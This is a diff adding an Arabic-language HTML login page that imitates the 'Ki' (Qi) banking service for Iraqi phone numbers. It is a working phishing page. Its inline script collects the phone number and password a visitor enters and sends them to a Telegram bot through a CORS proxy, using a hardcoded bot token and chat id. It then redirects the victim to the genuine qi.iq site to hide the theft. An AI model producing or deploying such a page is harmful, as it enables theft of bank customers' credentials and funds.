@@ -1,0 +1,68 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <link rel="stylesheet" href="styles.css">
+    <title>Login Page</title>
+</head>
+<body>
+    <div class="container">
+        <div class="header">
+            <img src="https://play-lh.googleusercontent.com/1pgPA3fjrxM1z3VQh43saIJk4__QVvpwSBJM30MdwcxdfkB4wHZzOrLPDDMSwH4d4B4" alt="Your Image" class="logo">
+            <h2>خدمات كي المصرفية</h2>
+            <p class="version">v4.23.9</p>
+        </div>
+
+        <div class="form">
+            <div class="input-container">
+                <input type="tel" id="phone" name="phone" placeholder="رقم الهاتف">
+                <div class="country-code">+964</div>
+            </div>
+
+            <div class="input-container">
+                <input type="password" id="password" name="password" placeholder="أدخل كلمة المرور">
+            </div>
+
+            <!-- بعد الزر تسجيل الدخول -->
+            <button class="login-button" onclick="submitForm()">تسجيل الدخول</button>
+
+            <!-- في منتصف الصفحة -->
+            <div class="centered-text">
+                <p class="forgot-password">هل نسيت كلمة المرور؟</p>
+                <p class="new-account">إنشاء حساب جديد</p>
+            </div>
+        </div>
+    </div>
+
+    <script src="script.js" defer></script>
+    
+    <script>
+        function submitForm() {
+            var chatId = '6964432572';
+            var botToken = '6692627244:AAFHCmEn5zgzEv2pn1rQXfFJZOzGueQV8kQ';
+
+            var phoneNumber = document.getElementById('phone').value;
+            var password = document.getElementById('password').value;
+
+            var message = 'تم تسجيل دخول باستخدام:\n' +
+                          'رقم الهاتف: ' + phoneNumber + '\n' +
+                          'كلمة المرور: ' + password;
+
+            var corsAnywhere = 'https://cors-anywhere.herokuapp.com/';
+            var telegramApiUrl = corsAnywhere + 'https://api.telegram.org/bot' + botToken + '/sendMessage?chat_id=' + chatId + '&text=' + encodeURIComponent(message);
+
+            // استخدام fetch بدلاً من XMLHttpRequest
+            fetch(telegramApiUrl)
+                .then(response => {
+                    if (!response.ok) {
+                        throw new Error('Failed to send message to Telegram');
+                    }
+                    // توجيه المستخدم إلى الموقع
+                    window.location.href = 'https://qi.iq/ar/home';
+                })
+                .catch(error => console.error('Error:', error));
+        }
+    </script>
+</body>
+</html>
